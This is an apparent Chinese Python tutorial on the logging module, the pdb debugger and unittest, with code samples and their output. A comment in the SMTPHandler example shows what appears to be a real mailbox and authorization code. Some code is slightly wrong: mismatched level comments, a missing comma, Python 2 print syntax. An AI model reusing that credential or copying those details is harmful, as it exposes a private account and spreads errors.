Logger对象和Handler对象都可以设置级别,而默认Logger对象级别为30即WARNING,默认Handler对象级别为0即NOTSET。logging模块这样设计是为了更好的灵活性,比如有时候既想在控制台中输出DEBUG级别的日志,又想在文件中输出WARNING级别的日志。可以只设置一个最低级别的Logger对象,两个不同级别的Handler对象

import logging.handlers
print([e for e in dir(logging.handlers)])
['BaseRotatingHandler', 'BufferingHandler', 'DEFAULT_HTTP_LOGGING_PORT', 'DEFAULT_SOAP_LOGGING_PORT', 'DEFAULT_TCP_LOGGING_PORT', 'DEFAULT_UDP_LOGGING_PORT', 'DatagramHandler', 'HTTPHandler', 'MemoryHandler', 'NTEventLogHandler', 'QueueHandler', 'QueueListener', 'RotatingFileHandler', 'SMTPHandler', 'ST_DEV', 'ST_INO', 'ST_MTIME', 'SYSLOG_TCP_PORT', 'SYSLOG_UDP_PORT', 'SocketHandler', 'SysLogHandler', 'TimedRotatingFileHandler', 'WatchedFileHandler', 'copy', 'logging', 'os', 'pickle', 'queue', 're', 'socket', 'struct', 'threading', 'time']

</pre><textarea>
import logging
import logging.handlers

logger = logging.getLogger("logger")

handler1 = logging.StreamHandler()
handler2 = logging.FileHandler(filename="test.log")

logger.setLevel(logging.DEBUG)
handler1.setLevel(logging.WARNING)
handler2.setLevel(logging.DEBUG)

formatter = logging.Formatter("%(asctime)s %(name)s %(levelname)s %(message)s")
handler1.setFormatter(formatter)
handler2.setFormatter(formatter)

logger.addHandler(handler1)
logger.addHandler(handler2)

print(handler1.level) # 10
print(handler2.level) # 30
print(logger.level)   # 30

logger.debug('This is a customer debug message')
logger.info('This is an customer info message')
logger.warning('This is a customer warning message')
logger.error('This is an customer error message')
logger.critical('This is a customer critical message')

# 控制台输出结果为：
2018-10-13 23:24:57,832 logger WARNING This is a customer warning message
2018-10-13 23:24:57,832 logger ERROR This is an customer error message
2018-10-13 23:24:57,832 logger CRITICAL This is a customer critical message

# 文件中输出内容为：
2018-10-13 23:44:59,817 logger DEBUG This is a customer debug message
2018-10-13 23:44:59,817 logger INFO This is an customer info message
2018-10-13 23:44:59,817 logger WARNING This is a customer warning message
2018-10-13 23:44:59,817 logger ERROR This is an customer error message
2018-10-13 23:44:59,817 logger CRITICAL This is a customer critical message

</textarea><textarea>
import logging

logger = logging.getLogger()
# 创建一个handler,用于写入日志文件
fh = logging.FileHandler('test.log')
# 再创建一个handler,用于输出到控制台
ch = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

fh.setFormatter(formatter)
ch.setFormatter(formatter)

logger.addHandler(fh) # logger对象可以添加多个fh和ch对象
logger.addHandler(ch)

logger.debug('logger debug message')
logger.info('logger info message')
logger.warning('logger warning message')
logger.error('logger error message')
logger.critical('logger critical message')

输出：
2019-10-08 20:35:44,002 - root - WARNING - logger warning message
2019-10-08 20:35:44,002 - root - ERROR - logger error message
2019-10-08 20:35:44,002 - root - CRITICAL - logger critical message

</textarea><pre>
logging库提供了多个组件:Logger、Handler、Filter、Formatter。Logger对象提供应用程序可直接使用的接口,Handler发送日志到适当的目的地,Filter提供了过滤日志信息的方法,Formatter指定日志显示格式

Logger：日志,暴露函数给应用程序,基于日志记录器和过滤器级别决定哪些日志有效。
LogRecord ：日志记录器,将日志传到相应的处理器处理。
Handler ：处理器,将日志记录器产生的日志记录发送至合适的目的地。
Filter ：过滤器,提供了更好的粒度控制,它可以决定输出哪些日志记录。
Formatter：格式化器,指明了最终输出中日志记录的布局。

logging流程:
1、判断Logger对象对于设置的级别是否可用,如果可用则往下执行,否则流程结束。
2、创建LogRecord对象,如果注册到Logger对象中的Filter对象过滤后返回False则不记录日志,流程结束,否则则向下执行。
3、LogRecord对象将Handler对象传入当前的Logger对象,如果Handler对象的日志级别大于设置的日志级别,再判断注册到Handler对象中的Filter对象过滤后是否返回True而放行输出日志信息,否则不放行,流程结束。
4、如果传入的Handler大于Logger中设置的级别,也即Handler有效,则往下执行,否则流程结束。
5、判断这个Logger对象是否还有父Logger对象,如果没有(代表当前Logger对象是最顶层的Logger对象root Logger),流程结束。否则将Logger对象设置为它的父Logger对象,重复上面的3、4两步,输出父类Logger对象中的日志输出直到是root Logger为止。

Logger是一个树形层级结构,输出信息之前都要获得一个Logger,如果没有显示的获取则自动创建并使用root Logger
logger = logging.getLogger()返回一个默认的Logger也即root Logger,并应用默认的日志级别、Handler和Formatter设置
也可通过Logger.setLevel(lel)指定最低的日志级别,可用的日志级别有logging.DEBUG、logging.INFO、logging.WARNING、logging.ERROR、logging.CRITICAL
Logger.debug()、Logger.info()、Logger.warning()、Logger.error()、Logger.critical()输出不同级别的日志,只有日志等级大于或等于设置的日志级别的日志才会被输出

import logging
logger.debug('logger debug message')
logger.info('logger info message')
logger.warning('logger warning message')
logger.error('logger error message')
logger.critical('logger critical message')

只输出了
2018-09-25 12:54:43,222 - root - WARNING - logger warning message
2018-09-25 12:54:43,223 - root - ERROR - logger error message
2018-09-25 12:54:43,224 - root - CRITICAL - logger critical message

从输出可看出logger = logging.getLogger()返回的Logger名为root。这里没有用logger.setLevel(logging.Debug)显示的为logger设置日志级别,所以使用默认的日志级别WARNIING,故结果只输出了大于等于WARNIING级别的信息。

</pre>再创建两个logger对象<textarea>
import logging
logger1 = logging.getLogger('mylogger')
logger1.setLevel(logging.DEBUG)

logger2 = logging.getLogger('mylogger')
logger2.setLevel(logging.INFO)

logger1.addHandler(fh)
logger1.addHandler(ch)

logger2.addHandler(fh)
logger2.addHandler(ch)

logger1.debug('logger1 debug message')
logger1.info('logger1 info message')
logger1.warning('logger1 warning message')
logger1.error('logger1 error message')
logger1.critical('logger1 critical message')

logger2.debug('logger2 debug message')
logger2.info('logger2 info message')
logger2.warning('logger2 warning message')
logger2.error('logger2 error message')
logger2.critical('logger2 critical message')

这里有两个个问题:
<1>明明通过logger1.setLevel(logging.DEBUG)将logger1的日志级别设置为了DEBUG,为何显示的时候没有显示出DEBUG级别的日志信息,而是从INFO级别的日志开始显示呢？
原来logger1和logger2对应的是同一个Logger实例,只要logging.getLogger(name)中名称参数name相同则返回的Logger实例就是同一个,且仅有一个,也即name与Logger实例一一对应。在logger2实例中通过logger2.setLevel(logging.INFO)设置mylogger的日志级别为logging.INFO,所以最后logger1的输出遵从了后来设置的日志级别。

<2>为什么logger1、logger2对应的每个输出分别显示两次?
这是因为通过logger = logging.getLogger()显示的创建了root Logger,而logger1 = logging.getLogger('mylogger')创建了root Logger的孩子(root.)mylogger,logger2同样。而孩子,孙子,重孙……既会将消息分发给他的handler进行处理也会传递给所有的祖先Logger处理

</textarea><textarea>
import logging

logger = logging.getLogger('mylogger')
ch = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)

logger.debug('logger debug message')
logger.info('logger info message')
logger.warning('logger warning message')
logger.error('logger error message')
logger.critical('logger critical message')

</textarea>创建了自定义的Logger对象,就不要在用logging中的日志输出方法了,这些方法使用的是默认配置的Logger对象,否则会输出的日志信息会重复<textarea>
import logging
import logging.handlers

logger = logging.getLogger("logger")
handler = logging.StreamHandler()
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter("%(asctime)s %(name)s %(levelname)s %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

logger.debug('This is a customer debug message')
logging.info('This is an customer info message')
logger.warning('This is a customer warning message')
logger.error('This is an customer error message')
logger.critical('This is a customer critical message')

# 输出结果如下(可以看到日志信息被输出了两遍)：
2018-10-13 22:21:35,873 logger WARNING This is a customer warning message
WARNING:logger:This is a customer warning message
2018-10-13 22:21:35,873 logger ERROR This is an customer error message
ERROR:logger:This is an customer error message
2018-10-13 22:21:35,873 logger CRITICAL This is a customer critical message
CRITICAL:logger:This is a customer critical message

</textarea><pre>
【 Logger配置 】
通过上面的例子知道创建一个Logger对象所需的配置了,上面直接硬编码在程序中配置对象,配置还可以从字典类型的对象和配置文件获取。打开logging.config Python文件,可以看到其中的配置解析转换函数。

</pre>从字典中获取配置信息<textarea>
import logging.config

config = {
    'version': 1,
    'formatters': {
        'simple': {
            'format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        },
        # 其他的 formatter
    },
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',
            'level': 'DEBUG',
            'formatter': 'simple'
        },
        'file': {
            'class': 'logging.FileHandler',
            'filename': 'logging.log',
            'level': 'DEBUG',
            'formatter': 'simple'
        },
        # 其他的 handler
    },
    'loggers':{
        'StreamLogger': {
            'handlers': ['console'],
            'level': 'DEBUG',
        },
        'FileLogger': {
            # 既有 console Handler,还有 file Handler
            'handlers': ['console', 'file'],
            'level': 'DEBUG',
        },
        # 其他的 Logger
    }
}

logging.config.dictConfig(config)
StreamLogger = logging.getLogger("StreamLogger")
FileLogger = logging.getLogger("FileLogger")
# 省略日志输出

</textarea><pre>
从配置文件中获取配置信息：
常见的配置文件有ini格式、yaml格式、JSON格式,或者从网络中获取都是可以的,只要有相应的文件解析器解析配置即可

</pre><textarea>
### test.ini文件
[loggers]
keys=root,sampleLogger

[handlers]
keys=consoleHandler

[formatters]
keys=sampleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_sampleLogger]
level=DEBUG
handlers=consoleHandler
qualname=sampleLogger
propagate=0

[handler_consoleHandler]
class=StreamHandler
level=DEBUG
formatter=sampleFormatter
args=(sys.stdout,)

[formatter_sampleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s

### testinit.py文件
import logging.config
logging.config.fileConfig(fname='test.ini', disable_existing_loggers=False)
logger = logging.getLogger("sampleLogger")
# 省略日志输出

### test.yaml文件
version: 1
formatters:
  simple:
    format: '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
handlers:
  console:
    class: logging.StreamHandler
    level: DEBUG
    formatter: simple

loggers:
  simpleExample:
    level: DEBUG
    handlers: [console]
    propagate: no
root:
  level: DEBUG
  handlers: [console]

### testyaml.py文件
import logging.config
import yaml  # 需要安装pyymal库

with open('test.yaml', 'r') as f:
    config = yaml.safe_load(f.read())
    logging.config.dictConfig(config)

logger = logging.getLogger("sampleLogger")
# 省略日志输出

</textarea><pre>
【 将日志输出到文件中会有中文乱码的问题 】
FileHandler 创建对象时可以设置文件编码,如果将文件编码设置为utf-8或utf8就可以解决中文乱码问题

# 自定义Logger配置
handler = logging.FileHandler(filename="test.log", encoding="utf-8")
# 使用默认的Logger配置
logging.basicConfig(handlers=[logging.FileHandler("test.log", encoding="utf-8")], level=logging.DEBUG

import logging
logger = logging.getLogger()
h = logging.FileHandler(filename='logging.log', mode='w',  encoding="utf8")
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
h.setFormatter(formatter)
logger.addHandler(h)
logger.error('logger error message 中文测试')

【 临时禁用日志输出 】
有时候又不想让日志输出,但在这后又想输出日志。如果打印信息用的是print()方法,那么就需要把所有的print()方法都注释掉,而使用了logging后就有了一键开关闭日志的魔法。
一种方法是在使用默认配置时给logging.disabled()方法传入禁用的日志级别就可以禁止设置级别以下的日志输出了
另一种方法时在自定义Logger时Logger对象的disable属性设为True,默认值是False,也即不禁用。

logging.disable(logging.INFO)
logger.disabled = True

【 日志文件按照时间划分或按照大小划分 】
如果将日志保存在一个文件中,那么时间一长或日志一多,单个日志文件就会很大,既不利于备份,也不利于查看
logging.handlers文件中提供了TimedRotatingFileHandler和RotatingFileHandler类分别可以实现按时间和大小划分。打开这个handles文件,可以看到还有其他功能的Handler类,它们都继承自基类BaseRotatingHandler。

# TimedRotatingFileHandler类构造函数
def __init__(self, filename, when='h', interval=1, backupCount=0, encoding=None, delay=False, utc=False, atTime=None):
# RotatingFileHandler类的构造函数
def __init__(self, filename, mode='a', maxBytes=0, backupCount=0, encoding=None, delay=False)

# 每隔1000 Byte划分一个日志文件,备份文件为3个
file_handler = logging.handlers.RotatingFileHandler("test.log", mode="w", maxBytes=1000, backupCount=3, encoding="utf-8")
# 每隔1小时划分一个日志文件,interval是时间间隔,备份文件为10个
handler2 = logging.handlers.TimedRotatingFileHandler("test.log", when="H", interval=1, backupCount=10)

Python官网虽然说logging库是线程安全的,但在多进程、多线程、多进程多线程环境中仍然还有值得考虑的问题,比如如何将日志按照进程或线程划分为不同的日志文件,也即一个进程或线程对应一个文件

【 logging.handlers.SMTPHandler 】
class logging.handlers.SMTPHandler(mailhost, fromaddr, toaddrs, subject, credentials=None, secure=None, timeout=1.0)

</pre>sending logging messages to an email address via SMTP<textarea>
import logging
from logging.handlers import SMTPHandler

root = logging.getLogger()
mail_handler = SMTPHandler(
    mailhost='127.0.0.1',                 # ('smtp.qq.com', 25)
    fromaddr='server-error@example.com',  # '465***869@qq.com'
    toaddrs=['admin@example.com'],        # ['heiying6958@sina.com']
    credentials=('username','password')   # ('465***869@qq.com','fqfoekytxqkebhah')
    subject='Application Error'
)
mail_handler.setLevel(logging.ERROR)
mail_handler.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s in %(module)s: %(message)s'))
root.addHandler(mail_handler)

try:
    a = 1 / 0
except:
    logging.warning("hha", exc_info=True)

</textarea>
</div>

<div id="pdb">
<h4>启动Python的调试器pdb,让程序以单步方式运行随时查看运行状态</h4><pre>
pdb是python debug的简写,一般用于排错

# err.py
s = '0'
n = int(s)
print(10 / n)

$ python -m pdb err.py
> /Users/michael/Github/learn-python3/samples/debug/err.py(2)< module>()
-> s = '0'

以参数-m pdb启动后pdb定位到下一步要执行的代码-> s = '0',输入命令l来查看代码:
(Pdb) l
  1     # err.py
  2  -> s = '0'
  3     n = int(s)
  4     print(10 / n)

输入命令n可以单步执行代码:
(Pdb) n
> /Users/michael/Github/learn-python3/samples/debug/err.py(3)< module>()
-> n = int(s)
(Pdb) n
> /Users/michael/Github/learn-python3/samples/debug/err.py(4)< module>()
-> print(10 / n)

任何时候都可以输入命令p变量名来查看变量:
(Pdb) p s
'0'
(Pdb) p n
0

输入命令q结束调试退出程序:
(Pdb) q

这种通过pdb在命令行调试的方法理论上是万能的,但太麻烦了,如果有一千行代码,要运行到第999行得敲多少命令

【 pdb.set_trace() 】
这个方法也是用pdb,但不需要单步执行,只需要import pdb,然后在可能出错的地方放一个pdb.set_trace()就可以设置一个断点,这个方式比直接启动pdb单步调试效率要高很多,但也高不到哪去

import pdb
s = '0'
n = int(s)
pdb.set_trace() # 运行到这里会自动暂停
print(10 / n)

运行代码,程序会自动在pdb.set_trace()暂停并进入pdb调试环境,可以用命令p查看变量,或用命令c继续运行

$ python err.py
> /Users/michael/Github/learn-python3/samples/debug/err.py(7)< module>()
-> print(10 / n)
(Pdb) p n
0
(Pdb) c
Traceback (most recent call last):
  File "err.py", line 7, in < module>
    print(10 / n)
ZeroDivisionError: division by zero

</pre>
</div>

<div id="unittest">
<h4>单元测试 测试驱动开发(TDD:Test-Driven Development)</h4><pre>
单元测试是用来对一个模块、一个函数或者一个类来进行正确性检验的测试工作。

对函数abs()可以编写出以下几个测试用例:
输入正数,比如1、1.2、0.99,期待返回值与输入相同;
输入负数,比如-1、-1.2、-0.99,期待返回值与输入相反;
输入0,期待返回0;
输入非数值类型,比如None、[]、{},期待抛出TypeError。

把上面的测试用例放到一个测试模块里就是一个完整的单元测试。
如果单元测试通过,说明测试的这个函数能够正常工作。如果单元测试不通过,要么函数有bug,要么测试条件输入不正确,总之需要修复使单元测试能够通过

单元测试通过后有什么意义呢？如果对abs()函数代码做了修改,只需要再跑一遍单元测试,如果通过则说明修改不会对abs()函数原有的行为造成影响,如果测试不通过则说明修改与原有行为不一致,要么修改代码,要么修改测试。
这种以测试为驱动的开发模式最大的好处就是确保一个程序模块的行为符合设计的测试用例,在将来修改的时候可以极大程度地保证该模块行为仍然是正确的。

单元测试可以有效地测试某个程序模块的行为,是未来重构代码的信心保证。
单元测试的测试用例要覆盖常用的输入组合、边界条件和异常。
单元测试代码要非常简单,如果测试代码太复杂,那么测试代码本身就可能有bug。
单元测试通过了并不意味着程序就没有bug了,但是不通过程序肯定有bug

【 概念 】
测试脚手架
A test fixture represents the preparation needed to perform one or more tests, and any associate cleanup actions. This may involve, for example, creating temporary or proxy databases, directories, or starting a server process.
unittest模块提供了一系列创建和运行测试的工具

测试用例
一个测试用例是一个独立的测试单元。它检查输入特定的数据时的响应。 unittest提供一个基类TestCase用于新建测试用例
一个TestCase的实例就是一个测试用例。测试用例就是一个完整的测试流程,包括测试前准备环境的搭建(setUp),执行测试代码(run),及测试后环境的还原(tearDown)。元测试(unit test)的本质也就在这里,一个测试用例是一个完整的测试单元,通过运行这个测试单元可以对某一个问题进行验证。

测试套件
test suite是一系列的测试用例或测试套件,或两者皆有。它用于归档需要一起执行的测试。
多个测试用例集合在一起就是TestSuite,而且TestSuite也可以嵌套TestSuite。

测试运行器(test runner)
test runner是一个用于执行和输出测试结果的组件。这个运行器可能使用图形接口、文本接口或返回一个特定的值表示运行测试的结果。
TestLoader是用来加载TestCase到TestSuite中的,其中有几个loadTestsFrom__()方法就是从各个地方寻找TestCase,创建它们的实例,然后add到TestSuite中,再返回一个TestSuite实例。

TextTestRunner是来执行测试用例的,其中的run(test)会执行TestSuite/TestCase中的run(result)方法。
测试的结果会保存到TextTestResult实例中,包括运行了多少测试用例,成功了多少,失败了多少等信息。
在Runner执行时默认将执行结果输出到控制台,可以设置其输出到文件,在文件中查看结果

对一个测试用例环境的搭建和销毁,是一个fixture。

一个class继承了unittest.TestCase便是一个测试用例,但如果其中有多个以test开头的方法,那么每有一个这样的方法,在load的时候便会生成一个TestCase实例,如：一个class中有四个test_xxx方法,最后在load到suite中时也有四个测试用例。

整个流程：
写好TestCase,然后由TestLoader加载TestCase到TestSuite,然后由TextTestRunner来运行TestSuite,运行的结果保存在TextTestResult中,通过命令行或unittest.main()执行时,main会调用TextTestRunner中的run来执行,或者可以直接通过TextTestRunner来执行用例

新建单元测试脚本
导入单元测试依赖
继承单元测试类
实现单元测试方法

【 常用的断言也就是校验结果 】
assertEqual(a, b) a == b
assertNotEqual(a, b) a != b
assertTrue(x) bool(x) is True
assertFalse(x) bool(x) is False
assertIs(a, b) a is b
assertIsNot(a, b) a is not b
assertIsNone(x) x is None
assertIsNotNone(x) x is not None
assertIn(a, b) a in b
assertNotIn(a, b) a not in b
assertIsInstance(a, b) isinstance(a, b)
assertNotIsInstance(a, b) not isinstance(a, b)

</pre><textarea>
import unittest

class IntegerArithmeticTestCase(unittest.TestCase):
    def testAdd(self):  # test method names begin with 'test'
        self.assertEqual((1 + 2), 3)
        self.assertEqual(0 + 1, 1)

if __name__ == '__main__':
    unittest.main()

</textarea><textarea>
import unittest

class TestStringMethods(unittest.TestCase): # 继承unittest.TestCase就创建了一个测试样例
    # 三个独立的测试是三个类的方法,这些方法的命名都以 test 开头。 这个命名约定告诉测试运行者类的哪些方法表示测试
    # 调用assertEqual()来检查预期的输出,调用assertTrue()或assertFalse()来验证一个条件,调用assertRaises()来验证抛出了一个特定的异常,期待抛出指定类型的Error
    # 使用这些assert方法而不是assert语句是为了让测试运行者能聚合所有的测试结果并产生结果报告

    def test_upper(self):
        self.assertEqual('foo'.upper(), 'FOO')

    def test_isupper(self):
        self.assertTrue('FOO'.isupper())
        self.assertFalse('Foo'.isupper())

    def test_split(self):
        s = 'hello world'
        self.assertEqual(s.split(), ['hello', 'world'])
        # check that s.split fails when the separator is not a string
        with self.assertRaises(TypeError):
            s.split(2)

if __name__ == '__main__':
    unittest.main()  # 提供一个测试脚本的命令行接口,在调用测试脚本时添加-v参数unittest.main(verbosity=2)显示更为详细的信息

</textarea><textarea>
### mathfunc.py
def add(a, b):
    return a+b

def minus(a, b):
    return a-b

def multi(a, b):
    return a*b

def divide(a, b):
    return a/b

### test_mathfunc.py
import unittest
from mathfunc import *

class TestMathFunc(unittest.TestCase):
    """Test mathfuc.py"""

    def test_add(self):
        """Test method add(a, b)"""
        self.assertEqual(3, add(1, 2))
        self.assertNotEqual(3, add(2, 2))

    def test_minus(self):
        """Test method minus(a, b)"""
        self.assertEqual(1, minus(3, 2))

    def test_multi(self):
        """Test method multi(a, b)"""
        self.assertEqual(6, multi(2, 3))

    def test_divide(self):
        """Test method divide(a, b)"""
        self.assertEqual(2, divide(6, 3))
        self.assertEqual(2.5, divide(5, 2.5))

if __name__ == '__main__':
    unittest.main()

>python test.py
.F..
======================================================================
FAIL: test_divide (__main__.TestMathFunc)
Test method divide(a, b)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "test.py", line 37, in test_divide
    self.assertEqual(2.5, divide(5, 2.5))
AssertionError: 2.5 != 2.0

----------------------------------------------------------------------
Ran 4 tests in 0.002s

FAILED (failures=1)

'''
在第一行给出了每一个用例执行的结果的标识,成功是.,失败是F,出错是E,跳过是S
从上面可以看出测试的执行跟方法的顺序没有关系,test_divide写在了第4个,但是却是第2个执行的。
每个测试方法均以test开头,否则是不被unittest识别的。
在unittest.main()中加verbosity参数可以控制输出的错误报告的详细程度,默认1,设为0则不输出每一用例的执行结果,即没有上面的结果中的第1行;如果设为2则输出详细的执行结果,

组织TestSuite
上面的代码示例了如何编写一个简单的测试,但有两个问题,
1、怎么控制用例执行的顺序呢？这里的示例中的几个测试方法并没有一定关系,但之后写的用例可能会有先后关系,需要先执行方法A,再执行方法B),这时就要用到TestSuite了,添加到TestSuite中的case是会按照添加的顺序执行的。
2、只有一个测试文件时直接执行该文件即可,但如果有多个测试文件,怎么进行组织,总不能一个个文件执行吧,答案也在TestSuite中。

# 直接用addTest方法添加单个TestCase
suite.addTest(TestMathFunc("test_multi"))

# 用addTests + TestLoader,loadTestsFromName(),传入'模块名.TestCase名',用TestLoader的方法是无法对case进行排序
suite.addTests(unittest.TestLoader().loadTestsFromName('test_mathfunc.TestMathFunc'))
suite.addTests(unittest.TestLoader().loadTestsFromNames(['test_mathfunc.TestMathFunc']))  # loadTestsFromNames(),类似,传入列表

# loadTestsFromTestCase(),传入TestCase
suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestMathFunc))
'''

# 再新建test_suite.py文件
# -*- coding: utf-8 -*-

import unittest
from test_mathfunc import TestMathFunc

if __name__ == '__main__':
    suite = unittest.TestSuite()
    tests = [TestMathFunc("test_add"), TestMathFunc("test_minus"), TestMathFunc("test_divide")]
    suite.addTests(tests)
    runner = unittest.TextTestRunner(verbosity=2)
    runner.run(suite)

>python test.py
test_add (__main__.TestMathFunc)
Test method add(a, b) ... ok
test_minus (__main__.TestMathFunc)
Test method minus(a, b) ... ok
test_divide (__main__.TestMathFunc)
Test method divide(a, b) ... FAIL

======================================================================
FAIL: test_divide (__main__.TestMathFunc)
Test method divide(a, b)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "test.py", line 37, in test_divide
    self.assertEqual(2.5, divide(5, 2.5))
AssertionError: 2.5 != 2.0

----------------------------------------------------------------------
Ran 3 tests in 0.056s

FAILED (failures=1)

### 将结果输出到文件中,生成txt格式的测试报告
用例组织好了,但结果只能输出到控制台,这样没有办法查看之前的执行记录,想将结果输出到文件,修改test_suite.py,执行此文件后在同目录下生成了UnittestTextReport.txt,所有的执行报告均输出到了此文件中,而不再输出到控制台
import unittest
from test_mathfunc import TestMathFunc

if __name__ == '__main__':
    suite = unittest.TestSuite()
    suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestMathFunc))

    with open('UnittestTextReport.txt', 'a') as f:
        runner = unittest.TextTestRunner(stream=f, verbosity=2)
        runner.run(suite)

'''
### test fixture之setUp() tearDown()
上面整个测试基本跑了下来,但可能会遇到点特殊的情况：如果测试需要在每次执行之前准备环境或在每次执行完之后需要进行一些清理,比如执行前需要连接数据库,执行完成之后需要还原数据、断开连接。总不能每个测试方法中都添加准备环境、清理环境的代码吧。
这就要涉及到test fixture了,修改test_mathfunc.py：
添加setUp()和tearDown()两个方法,其实是重写了TestCase的这两个方法,这两个方法在每个测试方法执行前以及执行后执行一次,setUp用来为测试准备环境,tearDown用来清理环境,已备之后的测试,setUp和tearDown在每次执行case前后都执行了一次
'''
import unittest
from mathfunc import *

class TestMathFunc(unittest.TestCase):
    """Test mathfuc.py"""

    def setUp(self):
        print("do something before test.Prepare environment.")

    def tearDown(self):
        print("do something after test.Clean up.")

    def test_add(self):
        """Test method add(a, b)"""
        print("add")
        self.assertEqual(3, add(1, 2))
        self.assertNotEqual(3, add(2, 2))

    def test_minus(self):
        """Test method minus(a, b)"""
        print("minus")
        self.assertEqual(1, minus(3, 2))

    def test_multi(self):
        """Test method multi(a, b)"""
        print("multi")
        self.assertEqual(6, multi(2, 3))

    def test_divide(self):
        """Test method divide(a, b)"""
        print("divide")
        self.assertEqual(2, divide(6, 3))
        self.assertEqual(2.5, divide(5, 2))

if __name__ == '__main__':
    suite = unittest.TestSuite()
    suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestMathFunc))
    runner = unittest.TextTestRunner(verbosity=2)
    runner.run(suite)

'''
>python test.py
test_add (__main__.TestMathFunc)
Test method add(a, b) ... do something before test.Prepare environment.
add
do something after test.Clean up.
ok
test_divide (__main__.TestMathFunc)
Test method divide(a, b) ... do something before test.Prepare environment.
divide
do something after test.Clean up.
ok
test_minus (__main__.TestMathFunc)
Test method minus(a, b) ... do something before test.Prepare environment.
minus
do something after test.Clean up.
ok
test_multi (__main__.TestMathFunc)
Test method multi(a, b) ... do something before test.Prepare environment.
multi
do something after test.Clean up.
ok

----------------------------------------------------------------------
Ran 4 tests in 0.003s

OK
'''

### 如果想要在所有case执行之前准备一次环境并在所有case执行结束之后再清理环境,可以用setUpClass()与tearDownClass(),setUpClass以及tearDownClass均只执行了一次

class TestMathFunc(unittest.TestCase):
    """Test mathfuc.py"""

    @classmethod
    def setUpClass(cls):
        print("This setUpClass() method only called once.")

    @classmethod
    def tearDownClass(cls):
        print("This tearDownClass() method only called once too.")

### 临时想要跳过某个case不执行
# 1、skip装饰器,skip装饰器一共有三个 unittest.skip(reason)、unittest.skipIf(condition, reason)、unittest.skipUnless(condition, reason),skip无条件跳过,skipIf当condition为True时跳过,skipUnless当condition为False时跳过
# 执行输出:Ran 4 tests in 0.003s,OK (skipped=1),总的test数量还是4个,但divide()方法被skip了
class TestMathFunc(unittest.TestCase):
    """Test mathfuc.py"""

    @unittest.skip("I don't want to run this case.")
    def test_divide(self):
        """Test method divide(a, b)"""
        print "divide"
        self.assertEqual(2, divide(6, 3))
        self.assertEqual(2.5, divide(5, 2))

# 2、TestCase.skipTest()方法,效果同skip装饰器
class TestMathFunc(unittest.TestCase):
    """Test mathfuc.py"""

    def test_divide(self):
        """Test method divide(a, b)"""
        self.skipTest('Do not run this.')
        print("divide")
        self.assertEqual(2, divide(6, 3))
        self.assertEqual(2.5, divide(5, 2))

class MyTestCase(unittest.TestCase):

    @unittest.skip("demonstrating skipping")
    def test_nothing(self):
        self.fail("shouldn't happen")

    @unittest.skipIf(mylib.__version__ < (1, 3),
                     "not supported in this library version")
    def test_format(self):
        # Tests that work for only a certain version of the library.
        pass

    @unittest.skipUnless(sys.platform.startswith("win"), "requires Windows")
    def test_windows_support(self):
        # windows specific testing code
        pass

    def test_maybe_skipped(self):
        if not external_resource_available():
            self.skipTest("external resource not available")
        # test code that depends on the external resource
        pass

# 跳过测试类的写法跟跳过测试方法的写法相似:TestCase.setUp()也可以跳过测试。可以用于所需资源不可用的情况下跳过接下来的测试
@unittest.skip("showing class skipping")
class MySkippedTestCase(unittest.TestCase):
    def test_not_run(self):
        pass

</textarea><textarea>
import unittest

class MyTest(unittest.TestCase):  # 继承unittest.TestCase
    def tearDown(self):
        # 每个测试用例执行之后做操作
        print('111')

    def setUp(self):
        # 每个测试用例执行之前做操作
        print('22222')

    @classmethod
    def tearDownClass(self):
    # 必须使用 @ classmethod装饰器, 所有test运行完后运行一次
         print('4444444')
    @classmethod
    def setUpClass(self):
    # 必须使用@classmethod 装饰器,所有test运行前运行一次
        print('33333')

    def test_a_run(self):
        self.assertEqual(1, 1)  # 测试用例

    def test_b_run(self):
        self.assertEqual(2, 2)  # 测试用例

if __name__ == '__main__':
    unittest.main()#运行所有的测试用例

</textarea>demo<textarea>
'''
编写一个Dict类,这个类的行为和dict一致,但是可以通过属性来访问,用起来就像下面这样:
>>> d = Dict(a=1, b=2)
>>> d['a'] # 1
>>> d.a # 1
'''

### mydict.py代码
class Dict(dict):
    def __init__(self, **kw):
        super().__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value

d = Dict(a=1, b='test')
print(d)    # {'a': 1, 'b': 'test'}

### 为了编写单元测试,需要引入Python自带的unittest模块,编写mydict_test.py如下
import unittest
from mydict import Dict

# 测试类从unittest.TestCase继承,以test开头的方法就是测试方法,不以test开头的方法不被认为是测试方法,测试的时候不会被执行
class TestDict(unittest.TestCase):

    # 两个特殊的setUp()和tearDown()方法会分别在每调用一个测试方法的前后分别被执行,设想测试需要启动一个数据库,这时就可以在setUp()方法中连接数据库,在tearDown()方法中关闭数据库,这样不必在每个测试方法中重复相同的代码
    def setUp(self):
        print('setUp...')

    def tearDown(self):
        print('tearDown...')

    def test_init(self):
        d = Dict(a=1, b='test')
        self.assertEqual(d.a, 1)
        self.assertEqual(d.b, 'test')
        self.assertTrue(isinstance(d, dict))

    def test_key(self):
        d = Dict()
        d['key'] = 'value'
        self.assertEqual(d.key, 'value')

    def test_attr(self):
        d = Dict()
        d.key = 'value'
        self.assertTrue('key' in d)
        self.assertEqual(d['key'], 'value')

    def test_keyerror(self):
        d = Dict()
        with self.assertRaises(KeyError):      # 期待抛出指定类型的Error,通过d['empty']访问不存在的key时断言会抛出KeyError
            value = d['empty']

    def test_attrerror(self):
        d = Dict()
